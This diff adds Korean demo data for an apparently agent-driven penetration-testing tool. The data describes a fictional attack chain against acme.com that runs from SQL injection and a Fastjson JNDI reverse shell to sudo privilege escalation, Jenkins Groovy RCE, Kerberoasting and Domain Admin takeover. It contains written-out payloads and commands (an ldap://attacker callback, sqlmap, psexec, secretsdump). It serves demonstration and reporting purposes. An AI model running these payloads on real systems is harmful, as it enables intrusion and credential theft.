@@ -1,0 +1,167 @@
+1454	외부 보안 평가
+1455	Acme 홈페이지 및 관리 시스템 외부 침투 테스트(acme.com)
+1456	acme.com의 관리 권한 획득 및 사용자 민감정보 접근 가능 여부를 검증합니다.
+1457	API 집중 점검
+1458	api.acme.com 권한 우회 및 인젝션 테스트
+1459	api.acme.com 주문/사용자 API의 IDOR 및 인젝션 위험을 평가합니다.
+1460	shop.acme.com 결제 및 주문 흐름
+1461	결제 및 주문 API의 권한 우회, 금액 변조, 경쟁 조건 위험을 평가합니다.
+1462	외부 노출 영역 조사(VPN / 경계 서비스)
+1463	acme.com에서 외부에 노출된 취약한 경계 서비스를 식별합니다.
+1464	외부 웹 침투 테스트
+1465	대상의 인터넷 노출 영역을 블랙박스 방식으로 테스트합니다. 웹사이트, API 및 일반적인 관리 진입점을 포함합니다.
+1466	비인가 접근, 민감정보 유출 또는 서버 침해로 이어질 수 있는 보안 문제를 식별하고 검증합니다.
+1467	API 권한 우회 집중 점검
+1468	대상 API의 인증, 객체 수준 인가 및 역할 경계를 집중 테스트합니다.
+1469	IDOR, 수평·수직 권한 상승 및 대량 데이터 접근 위험을 확인합니다.
+1470	주 도메인
+1471	ICP-DEMO-2021
+1472	Acme 홈페이지
+1473	Acme Corp — 기업 홈페이지
+1474	관리 시스템
+1475	Acme Admin 로그인
+1476	Jenkins(내부)
+1477	홈페이지 검색 API의 오류 기반 SQL 인젝션
+1478	## 데모 취약점 개요\n\n`www.acme.com/search`의 `q` 매개변수에 **오류 기반 SQL 인젝션**(MSSQL)이 있어 데이터베이스 버전, 스키마 및 민감정보를 읽을 수 있는 가상 사례입니다.\n\n## 영향\n\n- `acme_prod` 데이터베이스의 테이블 구조와 사용자/주문 데이터 접근\n- 오류 응답을 통한 데이터 노출\n\n## 재현 기록\n\n1. 오류 기반 인젝션 요청:\n```http\nGET /search?q=1' AND 1=CONVERT(int,@@version)--\n```\n2. 응답에 MSSQL 버전 오류가 표시됨\n3. 데이터베이스 열거: `sqlmap -u "https://www.acme.com/search?q=1" --dbs`\n\n## 개선 권고\n\n- 문자열 연결 대신 매개변수화 쿼리/준비된 문장 사용\n- 운영 환경의 상세 오류 응답 비활성화\n- DB 계정 최소 권한 적용 및 `xp_cmdshell` 등 위험 확장 비활성화\n\n실제 대상에서 확인한 결과가 아닌 화면 시연용 데이터입니다.
+1479	www.acme.com/search의 q 매개변수에 오류 기반 SQL 인젝션 존재
+1480	GET /search?q=1' AND 1=CONVERT(int,@@version)-- → MSSQL 버전 오류가 반환되고 DB 구조를 읽을 수 있음.
+1481	Acme 홈페이지 및 관리 시스템 외부 침투 테스트
+1482	api.acme.com/v1/orders?id=에서 다른 사용자의 주문을 조회할 수 있음
+1483	id=1001을 id=1002로 바꾸면 배송 주소와 전화번호를 포함한 다른 사용자의 주문이 반환됨. 소유권 검증 없음.
+1484	API JWT의 취약한 키로 인해 오프라인 추측 및 위조 가능
+1485	HS256, 키 'secret', john으로 5초 내 확인 → 임의의 sub를 위조하여 권한 우회 가능.
+1486	검색 페이지의 q 매개변수 미이스케이프로 인한 반사형 XSS
+1487	q=<script>alert(document.domain)</script>가 결과 제목에 그대로 표시됨.
+1488	www.acme.com의 .git 디렉터리 노출로 소스 복원 가능
+1489	GET /.git/HEAD → 200. git-dumper로 백엔드 소스와 DB 연결 문자열 주석 복원.
+1490	admin.acme.com 관리 시스템의 기본 비밀번호 admin/admin123
+1491	로그인 성공 후 관리 시스템에 접근하여 사용자와 주문을 관리할 수 있음.
+1492	로그인 후 next 매개변수를 통한 임의 리디렉션
+1493	/login?next=https://evil.example에서 로그인 후 외부 사이트로 302 리디렉션됨.
+1494	로그인 API에 요청 속도 제한이 없어 비밀번호 무차별 대입 가능
+1495	분당 1,000회 요청에도 잠금이나 CAPTCHA 없음.
+1496	API 500 응답의 스택 트레이스로 경로 및 프레임워크 버전 노출
+1497	500 오류 시 Node.js 스택이 반환되어 절대 경로와 의존성 버전이 노출됨.
+1498	shop에서 알려진 RCE가 있는 구버전 구성요소 사용
+1499	지문 분석으로 구성요소 v2.3.1 확인. CVE-2024-xxxx 역직렬화 RCE에 해당하는 가상 사례.
+1500	유출 소스에 DB 자격증명 sa/Acme@2021 하드코딩
+1501	www.acme.com/.git에서 git-dumper로 복원한 config.php에 평문 DB 비밀번호가 있으며 내부망에서도 재사용 가능한 것으로 확인된 데모 사례.
+1502	shop 쇼핑몰 Fastjson 역직렬화 원격 명령 실행
+1503	## 데모 취약점 개요\n\n`shop.acme.com`의 `/api/import`가 **Fastjson 1.2.24**로 사용자 JSON을 처리하며 `safeMode`가 꺼져 있는 가상 사례입니다. `@type`을 통한 클래스 지정으로 JNDI 인젝션 및 원격 명령 실행이 발생합니다.\n\n## 영향\n\n- 인증 없이 DMZ 웹 서버(`www-data@dmz-web01`)에서 명령 실행\n- 후속 권한 상승과 결합하여 내부망 진입점으로 이용 가능\n\n## 재현 기록\n\n1. 기존 데모의 JNDI 요청 본문:\n```json\n{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}\n```\n2. `POST /api/import`, `Content-Type: application/json`\n3. DNS 콜백과 역방향 셸 생성이 기록됨\n\n## 개선 권고\n\n- 안전한 지원 버전으로 업그레이드하고 `safeMode` 활성화\n- `/api/import` 인증 및 요청 출처 검증\n- 업무 서버의 외부 LDAP/RMI 연결 제한\n\n화면 시연용 가상 데이터이며 실제 테스트 결과가 아닙니다.
+1504	shop.acme.com Fastjson 1.2.24 역직렬화 원격 명령 실행
+1505	POST /api/import로 JNDI 본문(@type:JdbcRowSetImpl) 전송 → DNS 콜백 및 역방향 셸(www-data@dmz-web01) 생성 기록.
+1506	DMZ 서버의 sudo NOPASSWD 오설정으로 로컬 root 권한 상승 가능
+1507	sudo -l에 (ALL) NOPASSWD: /usr/bin/python3 표시 → sudo python3 -c 'os.setuid(0);os.system("/bin/sh")'로 root 획득 기록.
+1508	DMZ 서버의 이중 NIC가 내부망에 직접 연결되어 경계 격리 무효화
+1509	dmz-web01의 두 번째 NIC가 10.10.10.0/24에 연결되어 DMZ에서 도메인 컨트롤러, 파일 서버, Jenkins로 직접 접근 가능.
+1510	내부 Jenkins 비인가 Script Console 원격 명령 실행
+1511	GET /script에서 로그인 없이 Groovy 실행: 'whoami'.execute().text → SYSTEM. 자격증명 저장소에서 도메인 계정 acme\svc_deploy가 노출된 데모 기록.
+1512	도메인 서비스 계정 svc_sql의 Kerberoasting 노출 및 취약한 비밀번호
+1513	GetUserSPNs로 svc_sql의 TGS를 요청하고 hashcat -m 13100으로 Sql@2020을 오프라인 확인한 데모. 해당 계정은 SQL 관리 그룹 소속.
+1514	내부망 도메인 컨트롤러 DC01 전체 제어(Domain Admin)
+1515	## 데모 취약점 개요\n\n외부 Fastjson RCE로 DMZ에 접근한 뒤 sudo 권한 상승, 이중 NIC 경유, Jenkins 비인가 RCE를 통해 도메인 계정 `svc_deploy`를 얻는 가상 사례입니다. 계정이 **Domain Admins** 소속이므로 **DC01** 전체 제어로 이어집니다.\n\n## 영향\n\n도메인 관리자 권한 획득으로 도메인 호스트와 계정을 제어할 수 있으며 `krbtgt`를 포함한 NTLM 해시 유출 위험이 있습니다.\n\n## 기존 데모 재현 기록\n\n```text\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\nDC01의 SYSTEM 권한과 도메인 해시 유출이 기록된 시연 데이터입니다.\n\n## 개선 권고\n\n서비스 계정의 Domain Admins 권한 제거, 계층별 관리 적용, `krbtgt` 및 서비스 자격증명 교체, DMZ와 내부망 격리, 선행 RCE 및 권한 상승 문제 수정이 필요합니다.\n\n실제 테스트 결과가 아닌 화면 시연용 데이터입니다.
+1516	도메인 컨트롤러 DC01 제어(Domain Admin) — 내부 대상 목표 달성
+1517	svc_deploy가 Domain Admins 소속. psexec.py로 DC01에 로그인해 SYSTEM을 얻고 secretsdump로 krbtgt를 포함한 도메인 NTLM 해시를 추출한 데모 기록.
+1518	시작: acme.com 외부망 → 내부망 심층 침투 테스트
+1519	acme.com 관리 권한 획득
+1520	사용자 민감정보 읽기
+1521	외부에서 DMZ를 통과해 내부망 진입점 확보
+1522	내부망 수평 이동으로 도메인 컨트롤러 DC01 제어
+1523	acme.com 서브도메인 열거 및 포트 스캔
+1524	관리 시스템 기본 비밀번호 / 취약한 비밀번호 테스트
+1525	관리 기능 및 사용자 데이터 API 열거
+1526	www.acme.com/search 페이지 SQL 인젝션 점검
+1527	api.acme.com 주문 API 권한 우회(IDOR) 테스트
+1528	www.acme.com .git 소스 노출 및 하드코딩 자격증명 확인
+1529	shop.acme.com 구성요소 지문 분석 및 CVE 연결
+1530	shop 역직렬화 RCE 검증 및 역방향 셸 획득
+1531	DMZ 진입점의 로컬 정보 수집 및 root 권한 상승
+1532	진입점을 경유한 내부망 호스트 탐색
+1533	내부망 자격증명 재사용 및 비밀번호 스프레이 테스트
+1534	내부 Jenkins 비인가 Groovy 스크립트 실행(RCE)
+1535	도메인 서비스 계정 Kerberoasting 및 오프라인 검증
+1536	도메인 관리자 자격증명으로 DC01 로그인 및 제어
+1537	서브도메인 admin.acme.com 발견(Element-UI 관리 시스템)
+1538	search 페이지의 q 매개변수가 오류 기반 인젝션 지점(MSSQL)
+1539	.git 다운로드 가능, git-dumper로 백엔드 소스 복원
+1540	소스 config.php에 DB 비밀번호 sa / Acme@2021 하드코딩(내부망 공용 비밀번호로 추정)
+1541	shop 지문에서 Fastjson 1.2.24 확인(알려진 역직렬화 RCE)
+1542	역방향 셸 연결 성공: www-data@dmz-web01(10.0.20.15), DMZ 대역
+1543	sudo -l: (ALL) NOPASSWD: /usr/bin/python3 → root 권한 상승 가능
+1544	진입점의 두 번째 NIC가 내부망 10.10.10.0/24에 직접 연결(DMZ 경계 통과)
+1545	내부망 활성 호스트: 10.10.10.10 DC01(도메인 컨트롤러) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS
+1546	JENKINS 콘솔 /script에 인증이 없어 Groovy 직접 실행 가능
+1547	Jenkins 자격증명 저장소에서 도메인 계정 acme\svc_deploy의 평문 비밀번호 확인
+1548	Kerberoasting으로 svc_sql의 TGS를 획득하고 hashcat으로 Sql@2020 확인
+1549	관리 시스템 기본 비밀번호 admin/admin123
+1550	SQL 인젝션(search q)으로 acme_prod DB 읽기 가능
+1551	IDOR: /v1/orders?id=에서 다른 사용자의 주문 조회 가능
+1552	소스 노출 + 하드코딩된 DB 자격증명(sa/Acme@2021)
+1553	shop Fastjson 역직렬화 RCE로 서버 명령 실행 가능
+1554	DMZ 진입점에서 root로 로컬 권한 상승(sudo NOPASSWD 오설정)
+1555	내부 Jenkins의 비인가 Groovy 실행 → 서버 RCE
+1556	Kerberoasting을 통한 도메인 서비스 계정 svc_sql 비밀번호 확인
+1557	관리 시스템은 Element-UI이며 기본 비밀번호 목록을 먼저 테스트
+1558	내부망에서는 Jenkins 우선 점검: 인증 없는 /script에서 Groovy RCE
+1559	소스의 DB 비밀번호를 내부망에서 재사용하는지 확인
+1560	0라운드 · 목표 분해
+1561	graph_overview: 목표 계층에서 g1 「acme.com 관리 권한 획득」과 g2 「사용자 민감정보 읽기」로 분해했으며 모두 open입니다. facts=0이고 recent_facts도 비어 있습니다. 범위에는 루트 도메인 acme.com과 C 대역 하나만 있습니다. 초기 진입점은 www / admin / api / shop / vpn입니다. 첫 의도를 구체화하는 최소한의 읽기 전용 확인만 수행하며 실제 실행은 worker에게 맡깁니다.
+1562	초기 정보가 거의 없어 읽기 전용 확인을 최대 3회 수행해 첫 의도의 방향을 정합니다. 열거나 검증은 worker가 담당합니다.
+1563	acme.com → 302 → www; Server: nginx/1.24.0\nadmin.acme.com → 200, X-Powered-By 없음, 본문에서 element-ui/vue 특징 확인
+1564	admin은 독립적인 관리 로그인 페이지입니다. 다섯 진입점을 확인하여 첫 의도를 구체화할 수 있습니다.
+1565	add_intent × 4(첫 탐색 방향 일괄 배정)
+1566	intents=[\n { summary: 'acme.com 서브도메인 열거 및 활성 호스트 포트/서비스 식별', asset_ids: [acme.com], priority: 6 },\n { summary: 'admin.acme.com 기본/취약 비밀번호 테스트(Element-UI 로그인, CAPTCHA 없음)', asset_ids: [admin], priority: 9 },\n { summary: 'www.acme.com/search q 매개변수 SQL 인젝션 점검', asset_ids: [www], priority: 8 },\n { summary: 'api.acme.com 주문 API IDOR 테스트', asset_ids: [api], priority: 8 },\n]\nparent_ids는 모두 비어 있으며 최상위 새 방향으로 origin fact에 연결합니다.
+1567	4 intents created → ids=[i1, i2, i4, i5], frontier에 연결됨
+1568	i1 조사, i2 인증 경로(g1), i4/i5 데이터 경로(g2)로 방향을 분산합니다. 서로 다른 원리를 병렬로 점검하며 너무 일찍 한 경로에 집중하지 않습니다.
+1569	첫 의도 4개 배정: i1 자산 조사, i2 관리 비밀번호, i4 인젝션, i5 API 권한 우회. 각 목표를 독립적인 진입점으로 진행하며 worker의 사실 기록을 바탕으로 다음 단계를 정합니다.
+1570	1라운드 · 탐색 영역 확대
+1571	recent_facts에서 workG가 faGit(.git 소스 복원)과 faCreds(config.php의 sa/Acme@2021 하드코딩)를 기록했고, work#6은 fa3(Fastjson 1.2.24)을 기록했습니다. 내부망 비밀번호 재사용과 Fastjson RCE가 기존 인증/인젝션 경로와 다른 가능성을 보여줍니다. 먼저 faGit 상세에서 실제 산출물을 확인합니다.
+1572	node_detail(faGit) — workG가 복원한 소스 산출물 확인
+1573	add_intent 전에 worker가 실제로 무엇을 복원했는지 확인해 지문만으로 방향을 추정하지 않습니다.
+1574	faGit 증거: git-dumper로 config.php / db.php / order_api.php 복원. config.php에 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021'] 포함.
+1575	하드코딩된 주소는 내부망 10.10.10.5(FS01)를 가리킵니다. faCreds의 재사용 가능성 추정을 뒷받침하며 RCE 확인 후 해당 자격증명의 재사용 여부를 검증할 수 있습니다.
+1576	add_intent × 2(Fastjson 경로, 선행 조건이 충족된 단계부터 배정)
+1577	intents=[\n { summary: 'shop.acme.com 지문 상세 분석 및 Fastjson 1.2.24 CVE 연결', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n { summary: 'Fastjson 역직렬화 요청을 통한 shop RCE 및 역방향 셸 검증', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nTodoWrite에 지문 → RCE → 진입점 권한 상승을 기록했습니다. 권한 상승은 셸 확보 후 다음 라운드에서 배정합니다.
+1578	2 intents created → ids=[i6, i7], fa3에서 파생 관계 연결됨
+1579	소스, 하드코딩된 내부망 비밀번호, Fastjson RCE로 새 경로를 구성했습니다. g3 「외부에서 DMZ를 통과해 내부망 진입점 확보」를 등록하고 i6 지문/CVE 연결과 i7 RCE 검증을 배정했습니다. 셸에 의존하는 권한 상승은 대기 목록에 기록했습니다.
+1580	2라운드 · 진입점 확보 후 내부망 확인
+1581	i7이 fa4(DMZ의 www-data@dmz-web01 셸)를 기록했고 후속 확인에서 fa5(NOPASSWD python3)와 fa6(내부망으로 직접 연결된 두 번째 NIC)를 기록했습니다. g3의 조건을 충족하는지 fa6의 실제 접근 가능성을 확인한 뒤 prove_goal을 호출합니다.
+1582	node_detail(fa6) — 이중 NIC와 내부망 접근 가능 여부 확인
+1583	fa6 증거: ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(내부망). 10.10.10.10에 ping 성공, DMZ 경계 통과 확인.
+1584	reason: i7 RCE로 DMZ 진입점 확보(fa4), fa5로 root 권한 상승, fa6으로 내부망 직접 연결 및 DC01 ping 성공 확인. g3 조건 충족.
+1585	goal g3 → met(증거 fa6 연결). g1/g2/g4가 아직 미달성이므로 작업을 계속합니다.
+1586	add_intent × 4(진입점을 경유한 내부망 수평 이동 점검)
+1587	intents=[\n { summary: 'dmz-web01을 경유해 10.10.10.0/24 호스트 및 포트 식별', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n { summary: '하드코딩 비밀번호 sa/Acme@2021의 내부망 재사용 확인', parent_ids: [faCreds], priority: 8 },\n { summary: '내부 Jenkins(10.10.10.20)의 비인가 /script Groovy 실행 확인', parent_ids: [fa6], priority: 9 },\n { summary: '도메인 서비스 계정 Kerberoasting 및 오프라인 검증', parent_ids: [fa6], priority: 8 },\n]\n호스트 식별을 먼저 배정하고 나머지는 독립적인 수평 이동 점검 방향으로 다룹니다.
+1588	g3 달성 후 내부망 점검으로 전환합니다. g4 「도메인 컨트롤러 DC01 제어」를 등록하고 i9 호스트 식별 및 i10/i11/i12 병렬 점검을 배정했습니다. 자격증명 재사용 방향은 faCreds에 연결했습니다.
+1589	3라운드 · 대상 목표 달성 검토
+1590	i9는 fa7(DC01/FS01/JENKINS), i11은 fa8(Jenkins 비인가 Groovy)과 fa9(svc_deploy 평문 비밀번호), i12는 fa10(svc_sql 비밀번호 확인)을 기록했습니다. Domain Admins 소속 svc_deploy로 i13이 DC01에 접근한 기록이 있어 g4를 표시하기 전에 취약점 증거 연결을 확인합니다.
+1591	list_findings — DC01 제어 증거 확인
+1592	F-09 「DC01 전체 제어 및 도메인 해시 추출」 critical. 증거: psexec svc_deploy@10.10.10.10 + NTDS.dit dump. fa9→fa10→i13 연결 기록 존재.
+1593	reason: Jenkins에서 svc_deploy(Domain Admin) 노출 → psexec로 DC01 제어 → secretsdump 기록. F-09 확인으로 내부 대상 DC01 제어 목표 달성.
+1594	goal g4 → met. g2가 아직 open이므로 전체 작업은 종료하지 않습니다.
+1595	g4가 달성되어 외부 RCE → DMZ → 내부망 → 도메인 컨트롤러 경로가 연결되었습니다. g2는 아직 미달성이지만 실행 중인 i3와 i5가 해당 방향을 다루고 있습니다. 본질적으로 다른 새 방향이 없으므로 새 의도는 생성하지 않고 기존 결과를 기다립니다.
+1596	4라운드 · 관리 권한 확인 후 g2 집중
+1597	recent_facts에서 work#2가 관리 시스템 로그인 성공을 기록하여 i2가 done이 되었습니다. g1은 증거를 연결해 달성 표시합니다. g2는 API 접근만 확인했을 뿐 필요한 데이터 결과가 없어 달성으로 표시하지 않고 기존 의도를 구체화합니다.
+1598	reason: i2가 유출된 하드코딩 비밀번호 Acme@2021로 Element-UI 관리 시스템에 로그인하여 g1 관리 권한 조건을 충족했습니다.
+1599	goal g1 → met. 남은 목표: g2.
+1600	g2는 실제 사용자 데이터 접근을 입증해야 합니다. 현재 graph_overview에는 해당 결과가 없고 i3/i5도 running입니다. 관리 화면 접근만으로 met 처리하지 않고 필요한 증거를 확인합니다.
+1601	add_intent × 2(g2 관련 기존 데이터 접근 의도 구체화)
+1602	intents=[\n { summary: '로그인한 admin의 사용자 관리/내보내기 API 및 민감 필드 접근 검증', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n { summary: 'api.acme.com 주문 IDOR의 사용자 주문/PII 접근 검증', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\ni3/i5의 설명과 우선순위를 구체화하며 동의어 의도를 중복 생성하지 않습니다.
+1603	2 intents updated → ids=[i3, i5](우선순위를 9로 올리고 데이터 접근 검증으로 구체화)
+1604	g1/g3/g4가 달성되어 4개 중 3개 목표를 완료했습니다. g2는 실제 증거를 확인해야 하므로 i3/i5를 priority 9로 조정했고 worker 결과를 바탕으로 최종 판정합니다.
+1605	먼저 수동적 서브도메인 조사를 수행하고 활성 호스트의 포트와 서비스를 식별합니다.
+1606	www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 로그인\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]
+1607	활성 서브도메인 5개, admin은 관리 로그인 페이지입니다.
+1608	22/80/443 포트가 열려 있습니다.
+1609	upsert_asset × 6(서브도메인 및 서비스)
+1610	자산 조사를 마치고 admin.acme.com 관리 시스템 발견 내용을 그래프에 기록했습니다.
+1611	Element-UI 관리 로그인에 CAPTCHA와 속도 제한이 없습니다. 기본 비밀번호와 사전 기반 검증을 수행하는 데모입니다.
+1612	admin/admin 로그인 실패.
+1613	admin/admin123 로그인 성공, 세션 cookie 획득.
+1614	<title>Acme Admin · 콘솔
+1615	관리 콘솔 접근을 확인했습니다.
+1616	finding f-6 기록 후 g1 목표와 proves로 연결
+1617	기본 관리 비밀번호를 확인하여 목표 ① 달성.
+1618	search?q= 결과 제목에 q를 연결합니다. 작은따옴표 입력에 대한 오류 응답을 확인합니다.
+1619	MSSQL 오류 기반 인젝션 징후.
+1620	인젝션 가능 여부와 데이터베이스 4개 열거를 확인한 데모입니다.
